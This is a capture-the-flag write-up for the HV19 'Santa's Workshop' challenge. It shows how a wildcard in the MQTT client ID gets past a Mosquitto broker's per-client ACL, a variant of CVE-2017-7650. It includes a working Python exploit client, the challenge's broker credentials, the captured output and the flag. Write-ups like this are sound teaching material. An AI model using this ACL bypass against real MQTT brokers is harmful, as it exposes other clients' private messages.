# HV19.15 - Santa's Workshop

| Author | Level | Categories |
|---|---|---|
| inik & avarx | hard | fun |

## Given
The Elves are working very hard.
Look at http://whale.hacking-lab.com:2080/ to see how busy they are.

config.js:

```js
var mqtt;
var reconnectTimeout = 100;
var host = 'whale.hacking-lab.com';
var port = 9001;
var useTLS = false;
var username = 'workshop';
var password = '2fXc7AWINBXyruvKLiX';
var clientid = localStorage.getItem("clientid");
if (clientid == null) {
  clientid = ('' + (Math.round(Math.random() * 1000000000000000))).padStart(16, '0');
  localStorage.setItem("clientid", clientid);
}
var topic = 'HV19/gifts/'+clientid;
// var topic = 'HV19/gifts/'+clientid+'/flag-tbd';
var cleansession = true;
```

mqtt.js:
```js
// ...
mqtt = new Paho.MQTT.Client(
                host,
                port,
                path,
                clientid
);
// ...

function onConnect() {
    mqtt.subscribe(topic, {qos: 0});
}
//...
```

The webapp on http://whale.hacking-lab.com:2080/ generated a random, 16-digit clientId to connect to the MQTT broker at ws://whale.hacking-lab.com:9001. In my case, this was 123888932589762459

### Hints
Due to stability problems, time is extended for +24h

1. When you have the webpage open and the counter is running (for your clientid), the challenge works for you
2. Due to server instability there are websockets hangups. Reload of webpage (or restart of your script) will help and lead to 1)
3. There are possibilities to crash the server with dedicated client-ids, eg. very long client-ids. For this, the length of client is now limited to 30. For longer client-ids no count nor flag is published

## Approach

I wrote a python client using https://pypi.org/project/paho-mqtt/ (also https://www.eclipse.org/paho/clients/python/ and https://www.eclipse.org/paho/files/jsdoc/Paho.MQTT.Client.html) to be able to play around in a bit more flexible fashion.

In the beginning, I had some trouble connecting to the broker, which was half due to the broker being down, half due to me, not changing the client's connection mode from `tcp` to `websocket`.

I started by using the clientId that was intended by the webapp (`123888932589762459`).

Trying to subscribe to the `"$SYS/#"` topic (see https://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics), the following message was received: 
```
$SYS/broker/versionmosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)
```

So, I need to be smarter than this. Also, looking at `config.js`, there is a comment indicating that the flag could be the name of a sub-topic underneath my clientId's topic. Let's keep this in mind.

Checking the CVE (see https://nvd.nist.gov/vuln/detail/CVE-2017-7650) and its fix (see https://bugs.eclipse.org/bugs/attachment.cgi?id=268603&action=diff), one could see that any clientId containing one of `[+#/]` (with `+` and `#` being MQTT wildcard operators, see https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.pla.doc/q005010_.htm) was not supposed to work. Let's check how the elves fixed that bug...

Setting the clientId to `#` indeed prevented from connecting to the broker. However, setting it to `abc/#` connects just fine. 

After a couple of attempts, I got the following working solution.

### Solution

Connect with:
```python
clientid="123888932589762459/#"  # or "123888932589762459/+"
topic="HV19/gifts/123888932589762459/#"  # or topic="HV19/gifts/123888932589762459/+"
```
Remember that the topic we want is located underneath the `HV19/gifts/123888932589762459` topic? Let's go for that.

This produces the following output:
```
log:  Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)
2019-12-15 12:03:08.305653: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b'Congrats, you got it. The elves should not overrate their smartness!!!' 0 0 - (0, 0)
log:  Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)
2019-12-15 12:03:08.306256: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b'Congrats, you got it. The elves should not overrate their smartness!!!' 0 0 - (0, 0)
log:  Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)
2019-12-15 12:03:08.306764: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b'Congrats, you got it. The elves should not overrate their smartness!!!' 0 0 - (0, 0)
log:  Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)
2019-12-15 12:03:08.404884: HV19/gifts/123888932589762459/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} (0) b'Congrats, you got it. The elves should not overrate their smartness!!!' 0 0 - (0, 0)
```

Why does the clientId need to include the wildcard operator? This is because how the ACL is defined. Mosquitto lets you define an ACL in the form of `pattern read HV19/gifts/%c` which allows each client to read only from topics matching the indicated prefix followed by their clientId.

Here's my very simple python client:

```python
import paho.mqtt.client as mqtt
import datetime

# The callback for when the client receives a CONNACK response from the server.
def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe(topic)
    client.subscribe(topic+"/#")

def on_subscribe(client, userdata, mid, granted_qos, *args, **kwargs):
	print(str(mid))

def on_log(client, userdata, level, buf):
	print("log: ",buf)

# The callback for when a PUBLISH message is received from the server.
def on_message(client, userdata, msg):
	timestamp=str(datetime.datetime.now())
	print(timestamp + ": " + msg.topic+" ("+str(msg.mid)+") "+str(msg.payload)+" "+str(msg.dup)+" "+str(msg.qos)+" - "+str(msg.info))


clientid="123888932589762459/#"

topic="HV19/gifts/123888932589762459"

client = mqtt.Client(client_id=clientid, clean_session=True, transport='websockets')
client.on_connect = on_connect
client.on_subscribe = on_subscribe
client.on_message = on_message
client.on_log = on_log

client.username_pw_set('workshop', '2fXc7AWINBXyruvKLiX')
client.connect("whale.hacking-lab.com", 9001, 60)

print("Looping")
client.loop_forever()
```

### A simpler approach

Probably the simplest approach would have been to go to the webapp's local storage in the browser and edit the clientId value by appending `/#` to the existing 16-digit value.

In the browser's network analysis tab, messages like the following can then be appreciated: 
```
00000000: 308f 0100 4748 5631 392f 6769 6674 732f  0...GHV19/gifts/
00000001: 3132 3338 3838 3933 3235 3839 3736 3234  1238889325897624
00000002: 3539 2f48 5631 397b 4e30 5f31 6e70 7574  59/HV19{N0_1nput
00000003: 5f76 346c 3164 3474 3130 6e5f 3371 7534  _v4l1d4t10n_3qu4
00000004: 6c73 5f64 3173 3473 7433 727d 436f 6e67  ls_d1s4st3r}Cong
00000005: 7261 7473 2c20 796f 7520 676f 7420 6974  rats, you got it
00000006: 2e20 5468 6520 656c 7665 7320 7368 6f75  . The elves shou
00000007: 6c64 206e 6f74 206f 7665 7272 6174 6520  ld not overrate 
00000008: 7468 6569 7220 736d 6172 746e 6573 7321  their smartness!
00000009: 2121                                     !!
```

## Flag
```
HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}
```
